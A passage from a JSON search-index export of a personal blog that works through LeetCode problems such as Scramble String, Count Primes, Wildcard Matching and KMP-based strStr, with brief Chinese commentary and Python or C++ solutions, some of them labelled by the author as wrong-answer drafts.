id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e不同的DP不同的難易度\u003c/p\u003e","title":"leetcode-85 - Maximal Rectangle"},{"content":"動機 不同的DP不同的難易度\nProblem We can scramble a string s to get a string t using the following algorithm:\nIf the length of the string is 1, stop.If the length of the string is \u003e 1, do the following:Split the string into two non-empty substrings at a random index, i.e., if the string is s, divide it to x and y where s = x + y.Randomly decide to swap the two substrings or to keep them in the same order. i.e., after this step, s may become s = x + y or s = y + x.Apply step 1 recursively on each of the two substrings x and y.Given two strings s1 and s2 of the same length, return true if s2 is a scrambled string of s1, otherwise, return false.\nExample 1:\nInput: s1 = great, s2 = rgeatOutput: trueExplanation: One possible scenario applied on s1 is:great --\u003e gr/eat // divide at random index.gr/eat --\u003e gr/eat // random decision is not to swap the two substrings and keep them in order.gr/eat --\u003e g/r / e/at // apply the same algorithm recursively on both substrings. divide at ranom index each of them.g/r / e/at --\u003e r/g / e/at // random decision was to swap the first substring and to keep the second substring in the same order.r/g / e/at --\u003e r/g / e/ a/t // again apply the algorithm recursively, divide at to a/t.r/g / e/ a/t --\u003e r/g / e/ a/t // random decision is to keep both substrings in the same order.The algorithm stops now and the result string is rgeat which is s2.As there is one possible scenario that led s1 to be scrambled to s2, we return true.Example 2:\nInput: s1 = abcde, s2 = caebdOutput: falseExample 3:\nInput: s1 = a, s2 = aOutput: true Constraints:\ns1.length == s2.length1 \u003c= s1.length \u003c= 30s1 and s2 consist of lower-case English letters. Ver1:WA def allOcuurLenFromEnd(s,c,i,j): #print(\u0026#39;find\u0026#39;,c,i,j) ans = [] while i \u0026lt; j: i = s.find(c,i,j+1) if i != -1: ans.append(j-i+1) i += 1 else: break return ans dp = {} def f(s1,s2,i,j,l): #print(i,j,l) if (i,j,l) not in dp: if l is 0: dp[(i,j,l)] = True elif l is 1: dp[(i,j,l)] = s1[i] == s2[j] else: if s1[i] == s2[j]: dp[(i,j,l)] = f(s1,s2,i-1,j-1,l-1) else: ii = allOcuurLenFromEnd(s2,s1[i],j+1-l,j) #print(ii) for x in ii: ret = f(s1,s2,i-x,j-x,l-x) and f(s1,s2,i-1,j,x-1) #print(\u0026#34;ret\u0026#34;,ret,(i-x,j-x,l-x),(i-1,j,x-1)) if ret: dp[(i,j,l)] = ret return ret dp[(i,j,l)] = False #print((i,j,l),dp[(i,j,l)]) return dp[(i,j,l)] class Solution: def isScramble(self, s1: str, s2: str) -\u0026gt; bool: dp.clear() return f(s1,s2,len(s1)-1,len(s2)-1,len(s1)) Ver2: WA def allOcuurLenFromEnd(s,c,i,j): #print(\u0026#39;find\u0026#39;,c,i,j) ans = [] while i \u0026lt; j: i = s.find(c,i,j+1) if i != -1: ans.append(j-i+1) i += 1 else: break return ans def getll(s1,s2,i,j,limit): ll = 0 while 0 \u0026lt;= i and 0 \u0026lt;= j and s1[i] == s2[j] and limit \u0026gt; 0: ll += 1 i -= 1 j -= 1 limit -= 1 return ll dp = {} def f(s1,s2,i,j,l): print(i,j,l) if (i,j,l) not in dp: if l is 0: dp[(i,j,l)] = True elif l is 1: dp[(i,j,l)] = s1[i] == s2[j] else: if s1[i] == s2[j]: dp[(i,j,l)] = f(s1,s2,i-1,j-1,l-1) else: s2_start_index = j+1-l s2_end_index = j lens = allOcuurLenFromEnd(s2,s1[i],s2_start_index,s2_end_index) print(\u0026#34;lens\u0026#34;,lens) for x in lens: occur_in_s2 = j-x+1 pos_to_find_ll_in_s2_from = occur_in_s2-1 pos_to_find_ll_in_s1_from = i-1 ll = getll(s1,s2,pos_to_find_ll_in_s1_from,pos_to_find_ll_in_s2_from,l-1) lhs_len = l-x-ll print(\u0026#34;ll\u0026#34;,ll) lhs_s1_end = i-x-ll lhs_s2_end = j-x-ll rhs_len = x - 1 rhs_s1_end = i-1-ll rhs_s2_end = j ret = f(s1,s2,lhs_s1_end,lhs_s2_end,lhs_len) and f(s1,s2,rhs_s1_end,rhs_s2_end,rhs_len) print(\u0026#34;ret\u0026#34;,ret,(i-x,j-x,l-x),(i-1,j,x-1)) if ret: dp[(i,j,l)] = ret return ret dp[(i,j,l)] = False print((i,j,l),dp[(i,j,l)]) return dp[(i,j,l)] class Solution: def isScramble(self, s1: str, s2: str) -\u0026gt; bool: dp.clear() return f(s1,s2,len(s1)-1,len(s2)-1,len(s1)) Ver2: AC case 有點多\n交叉 直的 前或後有一樣的字 class Solution: def isScramble(self, s1: str, s2: str) -\u0026gt; bool: dp = {} if len(s1) != len(s2): return False #s1, s2 = removePrefix_postfix(s1,s2) #if not s1 and not s2: # return True for i in range(0,len(s1)): for j in range(0,len(s1)): dp[(i,j,1)] = s1[i] == s2[j] for l in range(2,len(s1)+1): for i in range(0,len(s1)): for j in range(0,len(s1)): if i-l \u0026lt; 0 or j-l \u0026lt; 0: dp[(i,j,l)] = False for l in range(2,len(s1)+1): for x in range(1,l): for i in range(1,len(s1)): if i-x \u0026gt;= 0: for j in range(1,len(s1)): if j-(l-x) \u0026gt;= 0: if (i,j,l) not in dp: dp[(i,j,l)] = False dp[(i,j,l)] = dp[(i,j,l)] or (i-l+1,j-l+1,1) in dp and dp[(i-l+1,j-l+1,1)] and dp[(i,j,l-1)] dp[(i,j,l)] = dp[(i,j,l)] or (dp[(i,j-(l-x),x)] and dp[(i-x,j,l-x)]) or (dp[(i,j,1)] and dp[(i-1,j-1,l-1)]) or (i-(l-x) \u0026gt;= 0 and j-(l-x) \u0026gt;= 0 and dp[(i,j,(l-x))] and dp[(i-(l-x),j-(l-x),x)]) #print((i,j,l),dp[(i,j,l)],(i,j-(l-x),x), dp[(i,j-(l-x),x)] ,(i-x,j,l-x), dp[(i-x,j,l-x)]) return dp[(len(s1)-1,len(s2)-1,len(s1))] Sol 照題目走\ndef cache_computing(f,is_computing=False): mem = {} @functools.wraps(f) def wrapper(*args,**kwds): if args not in mem: mem[args] = is_computing mem[args] = f(*args,**kwds) return mem[args] return wrapper class Solution: @cache_computing def isScramble(self, s1: str, s2: str) -\u0026gt; bool: #print(s1,s2) if not s1 and not s2: return True elif s1[0] == s2[0]: return self.isScramble(s1[1:],s2[1:]) elif len(s1) == 1: return False else: return any([(self.isScramble(s1[k:],s2[k:]) and self.isScramble(s1[:k],s2[:k])) or (self.isScramble(s1[k:],s2[:len(s2)-k]) and self.isScramble(s1[:k],s2[len(s2)-k:])) for k in range(1,len(s1))]) ","permalink":"https://littlebees.github.io/2021/07/leetcode-87-scramble-string/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e不同的DP不同的難易度\u003c/p\u003e","title":"leetcode-87 - Scramble String"},{"content":"動機 畫裡面那一個橢圓，很有趣\nProblem You are given a perfect binary tree where all leaves are on the same level, and every parent has two children. The binary tree has the following definition:\nstruct Node { int val; Node *left; Node *right; Node *next;}Populate each next pointer to point to its next right node. If there is no next right node, the next pointer should be set to NULL.\nInitially, all next pointers are set to NULL.\nFollow up:\nYou may only use constant extra space.Recursive approach is fine, you may assume implicit stack space does not count as extra space for this problem. Example 1:\nInput: root = [1,2,3,4,5,6,7]Output: [1,#,2,3,#,4,5,6,7,#]Explanation: Given the above perfect binary tree (Figure A), your function should populate each next pointer to point to its next right node, just like in Figure B. The serialized output is in level order as connected by the next pointers, with '#' signifying the end of each level. Constraints:\nThe number of nodes in the given tree is less than 4096.-1000 \u003c= node.val \u003c= 1000 Sol 看root的\n右邊的左，之後一直左 左邊的右，之後一直右 class Solution: def connect(self, r: \u0026#39;Node\u0026#39;) -\u0026gt; \u0026#39;Node\u0026#39;: if r: self.connect(r.left) self.connect(r.right) a, b = r.left, r.right while a: a.next = b a,b = a.right, b.left return r ","permalink":"https://littlebees.github.io/2021/07/leetcode-116-populating-next-right-pointers-in-each-node/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e畫裡面那一個橢圓，很有趣\u003c/p\u003e","title":"leetcode-116 - Populating Next Right Pointers in Each Node"},{"content":"動機 之前是用ruby的buildin作弊阿wwwww\nProblem Count the number of prime numbers less than a non-negative number, n.\nExample 1:\nInput: n = 10Output: 4Explanation: There are 4 prime numbers less than 10, they are 2, 3, 5, 7.Example 2:\nInput: n = 0Output: 0Example 3:\nInput: n = 1Output: 0 Constraints:\n0 \u003c= n \u003c= 5 * 106 Sol 這不是最快的，但是是最好玩的\ngen_primes(source)中的D是放key的某些因數，因為key本身是質數的倍數，所以可以自己加一個質數來往前找倍數\nclass Solution: def countPrimes(self, n: int) -\u0026gt; int: def primes(): def odds(): n = 3 while True: yield n n += 2 yield 2 ps = [2] for n in odds(): isPrime = True for p in ps: if n % p == 0: isPrime = False if isPrime: yield n ps.append(n) def gen_primes(): def ints(): n = 2 while True: yield n n += 1 D = {} for q in ints(): if q not in D: yield q D[q * q] = [q] else: for p in D[q]: D.setdefault(p + q, []).append(p) del D[q] ret = 0 for x in gen_primes(): if n \u0026gt; x: ret+=1 else: break return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-204-count-primes/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e之前是用ruby的buildin作弊阿wwwww\u003c/p\u003e","title":"leetcode-204 - Count Primes"},{"content":"動機 真的看不懂以前寫什麼\nProblem Given the head of a singly linked list, group all the nodes with odd indices together followed by the nodes with even indices, and return the reordered list.\nThe first node is considered odd, and the second node is even, and so on.\nNote that the relative order inside both the even and odd groups should remain as it was in the input.\nYou must solve the problem in O(1) extra space complexity and O(n) time complexity.\nExample 1:\nInput: head = [1,2,3,4,5]Output: [1,3,5,2,4]Example 2:\nInput: head = [2,1,3,5,6,4,7]Output: [2,3,6,7,1,5,4] Constraints:\nn == number of nodes in the linked list0 \u003c= n \u003c= 104-106 \u003c= Node.val \u003c= 106 Sol 善用變數去抽象\nclass Solution: def oddEvenList(self, head: ListNode) -\u0026gt; ListNode: if not head: return None # head odd, even = head, head.next # collect odds, evens optr, eptr = odd, even oprev, eprev = None, None while optr and eptr and eptr.next: # 可以是None的前面要保證是有效的!! onext, enext = eptr.next, eptr.next.next # 可以是None的前面要保證是有效的!! eptr.next, optr.next = enext, onext oprev, eprev = optr, eptr optr, eptr = optr.next, eptr.next # break loop for p in [optr, eptr]: if p: p.next = None # connect if optr: optr.next = even else: oprev.next = even return odd ","permalink":"https://littlebees.github.io/2021/07/leetcode-328-odd-even-linked-list/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e真的看不懂以前寫什麼\u003c/p\u003e","title":"leetcode-328 - Odd Even Linked List"},{"content":"動機 像這種看起來很水的題目，有的時候都會也一些出乎意料的解法\nProblem Given an integer n, return true if it is a power of three. Otherwise, return false.\nAn integer n is a power of three, if there exists an integer x such that n == 3x.\nExample 1:\nInput: n = 27Output: trueExample 2:\nInput: n = 0Output: falseExample 3:\nInput: n = 9Output: trueExample 4:\nInput: n = 45Output: false Constraints:\n-231 \u003c= n \u003c= 231 - 1 Follow up: Could you solve it without loops/recursion? Sol 先算int溢位之前最大的3的次方，之後就是看能不能整除!!\nclass Solution: def isPowerOfThree(self, n: int) -\u0026gt; bool: return n \u0026gt; 0 and 1162261467 % n == 0 也可以用限制先算\nconstexpr int MaxPowerOfThree() { int n = 3; while (n \u0026lt; std::numeric_limits\u0026lt;int\u0026gt;::max() / 3) { n = n * 3; } return n; } bool isPowerOfThree(int n) { constexpr int maxPowerOfThree = MaxPowerOfThree(); return n \u0026gt; 0 \u0026amp;\u0026amp; maxPowerOfThree % n == 0; } ","permalink":"https://littlebees.github.io/2021/07/leetcode-326-power-of-three/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e像這種看起來很水的題目，有的時候都會也一些出乎意料的解法\u003c/p\u003e","title":"leetcode-326 - Power of Three"},{"content":"動機 如果沒有限制就很水\nProblem Given two integer arrays nums1 and nums2, return an array of their intersection. Each element in the result must appear as many times as it shows in both arrays and you may return the result in any order.\nExample 1:\nInput: nums1 = [1,2,2,1], nums2 = [2,2]Output: [2,2]Example 2:\nInput: nums1 = [4,9,5], nums2 = [9,4,9,8,4]Output: [4,9]Explanation: [9,4] is also accepted. Constraints:\n1 \u003c= nums1.length, nums2.length \u003c= 10000 \u003c= nums1[i], nums2[i] \u003c= 1000 Follow up:\nWhat if the given array is already sorted? How would you optimize your algorithm?What if nums1's size is small compared to nums2's size? Which algorithm is better?What if elements of nums2 are stored on disk, and the memory is limited such that you cannot load all elements into the memory at once? Sol 如果不care速度，就是找共有key，之後就是生內容物了\nclass Solution: def intersect(self, nums1: List[int], nums2: List[int]) -\u0026gt; List[int]: n1,n2 = Counter(nums1), Counter(nums2) return sum([min(n1[n],n2[n])*[n] for n in (set(n1.keys()) \u0026amp; set(n2.keys()))],[]) ","permalink":"https://littlebees.github.io/2021/07/leetcode-350-intersection-of-two-arrays-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e如果沒有限制就很水\u003c/p\u003e","title":"leetcode-350 - Intersection of Two Arrays II"},{"content":"動機 就reverse\nProblem Write a function that reverses a string. The input string is given as an array of characters s.\nExample 1:\nInput: s = [h,e,l,l,o]Output: [o,l,l,e,h]Example 2:\nInput: s = [H,a,n,n,a,h]Output: [h,a,n,n,a,H] Constraints:\n1 \u003c= s.length \u003c= 105s[i] is a printable ascii character. Follow up: Do not allocate extra space for another array. You must do this by modifying the input array in-place with O(1) extra memory.\nSol class Solution: def reverseString(self, s: List[str]) -\u0026gt; None: i,j = 0, len(s)-1 while i \u0026lt; j: s[i],s[j] = s[j],s[i] i,j = i+1,j-1 ","permalink":"https://littlebees.github.io/2021/07/leetcode-344-reverse-string/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就reverse\u003c/p\u003e","title":"leetcode-344 - Reverse String"},{"content":"動機 超常見水題\nProblem Given an integer n, return a string array answer (1-indexed) where:\nanswer[i] == FizzBuzz if i is divisible by 3 and 5.answer[i] == Fizz if i is divisible by 3.answer[i] == Buzz if i is divisible by 5.answer[i] == i if non of the above conditions are true. Example 1:\nInput: n = 3Output: [1,2,Fizz]Example 2:\nInput: n = 5Output: [1,2,Fizz,4,Buzz]Example 3:\nInput: n = 15Output: [1,2,Fizz,4,Buzz,Fizz,7,8,Fizz,Buzz,11,Fizz,13,14,FizzBuzz] Constraints:\n1 \u003c= n \u003c= 104 Sol class Solution: def fizzBuzz(self, n): def f(i): if i % 5 == 0 and i % 3 == 0: return \u0026#34;FizzBuzz\u0026#34; elif i % 5 == 0: return \u0026#34;Buzz\u0026#34; elif i % 3 == 0: return \u0026#34;Fizz\u0026#34; else: return str(i) return [f(i) for i in range(1,n+1)] ","permalink":"https://littlebees.github.io/2021/07/leetcode-412-fizz-buzz/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e超常見水題\u003c/p\u003e","title":"leetcode-412 - Fizz Buzz"},{"content":"動機 我的刪除不是你的刪除\nProblem Write a function to delete a node in a singly-linked list. You will not be given access to the head of the list, instead you will be given access to the node to be deleted directly.\nIt is guaranteed that the node to be deleted is not a tail node in the list.\nExample 1:\nInput: head = [4,5,1,9], node = 5Output: [4,1,9]Explanation: You are given the second node with value 5, the linked list should become 4 -\u003e 1 -\u003e 9 after calling your function.Example 2:\nInput: head = [4,5,1,9], node = 1Output: [4,5,9]Explanation: You are given the third node with value 1, the linked list should become 4 -\u003e 5 -\u003e 9 after calling your function.Example 3:\nInput: head = [1,2,3,4], node = 3Output: [1,2,4]Example 4:\nInput: head = [0,1], node = 0Output: [1]Example 5:\nInput: head = [-3,5,-99], node = -3Output: [5,-99] Constraints:\nThe number of the nodes in the given list is in the range [2, 1000].-1000 \u003c= Node.val \u003c= 1000The value of each node in the list is unique.The node to be deleted is in the list and is not a tail node Sol 把所有值往後移，再刪最後一個node\nclass Solution: def deleteNode(self, node): prev = None while node.next: node.val,prev = node.next.val,node node = node.next prev.next = None ","permalink":"https://littlebees.github.io/2021/07/leetcode-237-delete-node-in-a-linked-list/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e我的刪除不是你的刪除\u003c/p\u003e","title":"leetcode-237 - Delete Node in a Linked List"},{"content":"動機 原來要用一般除法\nProblem Evaluate the value of an arithmetic expression in Reverse Polish Notation.\nValid operators are +, -, *, and /. Each operand may be an integer or another expression.\nNote that division between two integers should truncate toward zero.\nIt is guaranteed that the given RPN expression is always valid. That means the expression would always evaluate to a result, and there will not be any division by zero operation.\nExample 1:\nInput: tokens = [2,1,+,3,*]Output: 9Explanation: ((2 + 1) * 3) = 9Example 2:\nInput: tokens = [4,13,5,/,+]Output: 6Explanation: (4 + (13 / 5)) = 6Example 3:\nInput: tokens = [10,6,9,3,+,-11,*,/,*,17,+,5,+]Output: 22Explanation: ((10 * (6 / ((9 + 3) * -11))) + 17) + 5= ((10 * (6 / (12 * -11))) + 17) + 5= ((10 * (6 / -132)) + 17) + 5= ((10 * 0) + 17) + 5= (0 + 17) + 5= 17 + 5= 22 Constraints:\n1 \u003c= tokens.length \u003c= 104tokens[i] is either an operator: +, -, *, or /, or an integer in the range [-200, 200]. Sol 最初用整數除法處理，就吃了一個奇怪的WA，最後才想到一般除法\nclass Solution: def evalRPN(self, ts: List[str]) -\u0026gt; int: stk = [] for t in ts: if t == \u0026#34;+\u0026#34;: stk.append(stk.pop()+stk.pop()) elif t == \u0026#34;*\u0026#34;: stk.append(stk.pop()*stk.pop()) elif t == \u0026#34;-\u0026#34;: b,a = stk.pop(),stk.pop() stk.append(a-b) elif t == \u0026#34;/\u0026#34;: b,a = stk.pop(),stk.pop() stk.append(int(a/b)) else: stk.append(int(t)) #print(t,stk) return stk[-1] ","permalink":"https://littlebees.github.io/2021/07/leetcode-150-evaluate-reverse-polish-notation/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e原來要用一般除法\u003c/p\u003e","title":"leetcode-150 - Evaluate Reverse Polish Notation"},{"content":"動機 複習dfs\nProblem Given an m x n matrix board containing 'X' and 'O', capture all regions that are 4-directionally surrounded by 'X'.\nA region is captured by flipping all 'O's into 'X's in that surrounded region.\nExample 1:\nInput: board = [[X,X,X,X],[X,O,O,X],[X,X,O,X],[X,O,X,X]]Output: [[X,X,X,X],[X,X,X,X],[X,X,X,X],[X,O,X,X]]Explanation: Surrounded regions should not be on the border, which means that any 'O' on the border of the board are not flipped to 'X'. Any 'O' that is not on the border and it is not connected to an 'O' on the border will be flipped to 'X'. Two cells are connected if they are adjacent cells connected horizontally or vertically.Example 2:\nInput: board = [[X]]Output: [[X]] Constraints:\nm == board.lengthn == board[i].length1 \u003c= m, n \u003c= 200board[i][j] is 'X' or 'O'. Sol 從邊dfs回去\nclass Solution: def solve(self, bs: List[List[str]]) -\u0026gt; None: def dfs(i,j): nonlocal bs if i \u0026lt; 0 or i \u0026gt;= len(bs) or j \u0026lt; 0 or j \u0026gt;= len(bs[0]) or bs[i][j] == \u0026#34;X\u0026#34; or bs[i][j] == \u0026#34;\u0026#34;: return elif bs[i][j] == \u0026#34;O\u0026#34;: bs[i][j] = \u0026#34;\u0026#34; [dfs(x,y) for (x,y) in [(i+1,j), (i,j+1), (i-1,j), (i,j-1)]] [[dfs(i,j) for j in range(len(bs[i]))] for i in [0,len(bs)-1]] [[dfs(i,j) for j in [0,len(bs[i])-1]] for i in range(len(bs))] #print(bs) for i in range(len(bs)): for j in range(len(bs[i])): if bs[i][j] == \u0026#34;\u0026#34;: bs[i][j] = \u0026#34;O\u0026#34; else: bs[i][j] = \u0026#34;X\u0026#34; ","permalink":"https://littlebees.github.io/2021/07/leetcode-130-surrounded-regions/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習dfs\u003c/p\u003e","title":"leetcode-130 - Surrounded Regions"},{"content":"動機 從背後來就是easy，從正面來就是地獄\nProblem You are given two integer arrays nums1 and nums2, sorted in non-decreasing order, and two integers m and n, representing the number of elements in nums1 and nums2 respectively.\nMerge nums1 and nums2 into a single array sorted in non-decreasing order.\nThe final sorted array should not be returned by the function, but instead be stored inside the array nums1. To accommodate this, nums1 has a length of m + n, where the first m elements denote the elements that should be merged, and the last n elements are set to 0 and should be ignored. nums2 has a length of n.\nExample 1:\nInput: nums1 = [1,2,3,0,0,0], m = 3, nums2 = [2,5,6], n = 3Output: [1,2,2,3,5,6]Explanation: The arrays we are merging are [1,2,3] and [2,5,6].The result of the merge is [1,2,2,3,5,6] with the underlined elements coming from nums1.Example 2:\nInput: nums1 = [1], m = 1, nums2 = [], n = 0Output: [1]Explanation: The arrays we are merging are [1] and [].The result of the merge is [1].Example 3:\nInput: nums1 = [0], m = 0, nums2 = [1], n = 1Output: [1]Explanation: The arrays we are merging are [] and [1].The result of the merge is [1].Note that because m = 0, there are no elements in nums1. The 0 is only there to ensure the merge result can fit in nums1. Constraints:\nnums1.length == m + nnums2.length == n0 \u003c= m, n \u003c= 2001 \u003c= m + n \u003c= 200-109 \u003c= nums1[i], nums2[j] \u003c= 109 Follow up: Can you come up with an algorithm that runs in O(m + n) time?\nSol class Solution: def merge(self, ns1: List[int], m: int, ns2: List[int], n: int) -\u0026gt; None: i, a, b = m+n-1, m-1, n-1 while i \u0026gt;= 0: if b \u0026gt;= 0 and a \u0026gt;= 0: if ns2[b] \u0026gt; ns1[a]: ns1[i], i = ns2[b], i-1 b -= 1 else: ns1[i], i = ns1[a], i-1 a -= 1 elif b \u0026gt;= 0: ns1[i], i = ns2[b], i-1 b -= 1 else: ns1[i], i = ns1[a], i-1 a -= 1 ","permalink":"https://littlebees.github.io/2021/07/leetcode-88-merge-sorted-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e從背後來就是easy，從正面來就是地獄\u003c/p\u003e","title":"leetcode-88 - Merge Sorted Array"},{"content":"動機 我忘了lowerbound\nProblem Given a non-negative integer x, compute and return the square root of x.\nSince the return type is an integer, the decimal digits are truncated, and only the integer part of the result is returned.\nNote: You are not allowed to use any built-in exponent function or operator, such as pow(x, 0.5) or x ** 0.5.\nExample 1:\nInput: x = 4Output: 2Example 2:\nInput: x = 8Output: 2Explanation: The square root of 8 is 2.82842..., and since the decimal part is truncated, 2 is returned. Constraints:\n0 \u003c= x \u003c= 231 - 1 Sol 所以我直接做bsearch，但要處理loop，loop發生在left等於mid時\nclass Solution: def mySqrt(self, x: int) -\u0026gt; int: a,b = 0,x+1 # 猜數字 while a\u0026lt;b: mid = (a+b)//2 tmp = mid**2 if tmp == x or mid == a: return mid elif tmp \u0026gt; x: b = mid else: a = mid return a ","permalink":"https://littlebees.github.io/2021/07/leetcode-69-sqrtx/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e我忘了lowerbound\u003c/p\u003e","title":"leetcode-69 - Sqrt(x)"},{"content":"動機 水題\nProblem Given a non-empty array of decimal digits representing a non-negative integer, increment one to the integer.\nThe digits are stored such that the most significant digit is at the head of the list, and each element in the array contains a single digit.\nYou may assume the integer does not contain any leading zero, except the number 0 itself.\nExample 1:\nInput: digits = [1,2,3]Output: [1,2,4]Explanation: The array represents the integer 123.Example 2:\nInput: digits = [4,3,2,1]Output: [4,3,2,2]Explanation: The array represents the integer 4321.Example 3:\nInput: digits = [0]Output: [1] Constraints:\n1 \u003c= digits.length \u003c= 1000 \u003c= digits[i] \u003c= 9 Sol class Solution: def plusOne(self, ds: List[int]) -\u0026gt; List[int]: carry, ds[-1] = 0,ds[-1]+1 for i in reversed(range(len(ds))): tmp = ds[i]+carry ds[i], carry = tmp % 10, tmp//10 if carry \u0026gt; 0: ret = [1] + ds else: ret = ds return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-66-plus-one/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e水題\u003c/p\u003e","title":"leetcode-66 - Plus One"},{"content":"動機 很有趣的dp\nProblem Given an input string (s) and a pattern (p), implement wildcard pattern matching with support for '?' and '*' where:\n'?' Matches any single character.'*' Matches any sequence of characters (including the empty sequence).The matching should cover the entire input string (not partial).\nExample 1:\nInput: s = aa, p = aOutput: falseExplanation: a does not match the entire string aa.Example 2:\nInput: s = aa, p = *Output: trueExplanation: '*' matches any sequence.Example 3:\nInput: s = cb, p = ?aOutput: falseExplanation: '?' matches 'c', but the second letter is 'a', which does not match 'b'.Example 4:\nInput: s = adceb, p = *a*bOutput: trueExplanation: The first '*' matches the empty sequence, while the second '*' matches the substring dce.Example 5:\nInput: s = acdcb, p = a*c?bOutput: false Constraints:\n0 \u003c= s.length, p.length \u003c= 2000s contains only lowercase English letters.p contains only lowercase English letters, '?' or '*'. Sol 原本在i \u0026lt; 0的case想說讓遞迴處理*，但是這樣會讓後面的i都要重新檢查，同時會因為*的case導致最後不論如何都會變成true或是loop 所以直接處理掉了\nclass Solution: def isMatch(self, s: str, p: str) -\u0026gt; bool: @cache def dp(i,j): if i \u0026lt; 0 and j \u0026lt; 0: return True elif j \u0026lt; 0: return False elif i \u0026lt; 0: return all([c == \u0026#39;*\u0026#39; for c in p[:j+1]]) # return dp(i,j-1) elif p[j] == \u0026#39;?\u0026#39;: return dp(i-1,j-1) elif p[j] == \u0026#39;*\u0026#39;: # single, none return dp(i-1,j) or dp(i,j-1) else: if s[i] == p[j]: return dp(i-1,j-1) else: return False return dp(len(s)-1,len(p)-1) ","permalink":"https://littlebees.github.io/2021/07/leetcode-44-wildcard-matching/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e很有趣的dp\u003c/p\u003e","title":"leetcode-44 - Wildcard Matching"},{"content":"動機 複習kmp\nProblem Implement strStr().\nReturn the index of the first occurrence of needle in haystack, or -1 if needle is not part of haystack.\nClarification:\nWhat should we return when needle is an empty string? This is a great question to ask during an interview.\nFor the purpose of this problem, we will return 0 when needle is an empty string. This is consistent to C's strstr() and Java's indexOf().\nExample 1:\nInput: haystack = hello, needle = llOutput: 2Example 2:\nInput: haystack = aaaaa, needle = bbaOutput: -1Example 3:\nInput: haystack = , needle = Output: 0 Constraints:\n0 \u003c= haystack.length, needle.length \u003c= 5 * 104haystack and needle consist of only lower-case English characters. Sol class Solution: def strStr(self, s: str, p: str) -\u0026gt; int: @cache def fail(i): if i \u0026lt;= 0: return 0 else: j = fail(i-1) while j \u0026gt; 0 and p[j] != p[i]: j = fail(j-1) return j+(1 if p[j] == p[i] else 0) i,j,n,m = 0,0,len(s),len(p) while i \u0026lt; n: if j == m: return i-m elif s[i] == p[j]: i += 1 j += 1 elif j == 0: i += 1 else: j = fail(j-1) return n-m if j == m else -1 ","permalink":"https://littlebees.github.io/2021/07/leetcode-28-implement-strstr/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習kmp\u003c/p\u003e","title":"leetcode-28 - Implement strStr()"},{"content":"動機 很像selection sort\nProblem Given an integer array nums sorted in non-decreasing order, remove the duplicates in-place such that each unique element appears only once. The relative order of the elements should be kept the same.\nSince it is impossible to change the length of the array in some languages, you must instead have the result be placed in the first part of the array nums. More formally, if there are k elements after removing the duplicates, then the first k elements of nums should hold the final result. It does not matter what you leave beyond the first k elements.\nReturn k after placing the final result in the first k slots of nums.\nDo not allocate extra space for another array. You must do this by modifying the input array in-place with O(1) extra memory.\nCustom Judge:\nThe judge will test your solution with the following code:\nint[] nums = [...]; // Input arrayint[] expectedNums = [...]; // The expected answer with correct lengthint k = removeDuplicates(nums); // Calls your implementationassert k == expectedNums.length;for (int i = 0; i \u003c k; i++) { assert nums[i] == expectedNums[i];}If all assertions pass, then your solution will be accepted.\nExample 1:\nInput: nums = [1,1,2]Output: 2, nums = [1,2,_]Explanation: Your function should return k = 2, with the first two elements of nums being 1 and 2 respectively.It does not matter what you leave beyond the returned k (hence they are underscores).Example 2:\nInput: nums = [0,0,1,1,1,2,2,3,3,4]Output: 5, nums = [0,1,2,3,4,_,_,_,_,_]Explanation: Your function should return k = 5, with the first five elements of nums being 0, 1, 2, 3, and 4 respectively.It does not matter what you leave beyond the returned k (hence they are underscores). Constraints:\n0 \u003c= nums.length \u003c= 3 * 104-100 \u003c= nums[i] \u003c= 100nums is sorted in non-decreasing order. Sol class Solution: def removeDuplicates(self, nums: List[int]) -\u0026gt; int: if not nums: return 0 else: i=1 for j in range(1,len(nums)): if nums[i-1] \u0026lt; nums[j]: nums[i],nums[j] = nums[j],nums[i] i += 1 return i ","permalink":"https://littlebees.github.io/2021/07/leetcode-26-remove-duplicates-from-sorted-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e很像selection sort\u003c/p\u003e","title":"leetcode-26 - Remove Duplicates from Sorted Array"},{"content":"動機 水\nProblem Write a function to find the longest common prefix string amongst an array of strings.\nIf there is no common prefix, return an empty string .\nExample 1:\nInput: strs = [flower,flow,flight]Output: flExample 2:\nInput: strs = [dog,racecar,car]Output: Explanation: There is no common prefix among the input strings. Constraints:\n1 \u003c= strs.length \u003c= 2000 \u003c= strs[i].length \u003c= 200strs[i] consists of only lower-case English letters. Sol class Solution: def longestCommonPrefix(self, strs: List[str]) -\u0026gt; str: i = 0 while i \u0026lt; len(strs[0]) and all([i \u0026lt; len(s) and s[i] == strs[0][i] for s in strs]): i+=1 return strs[0][:i] ","permalink":"https://littlebees.github.io/2021/07/leetcode-14-longest-common-prefix/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e水\u003c/p\u003e","title":"leetcode-14 - Longest Common Prefix"},{"content":"動機 水\nProblem Roman numerals are represented 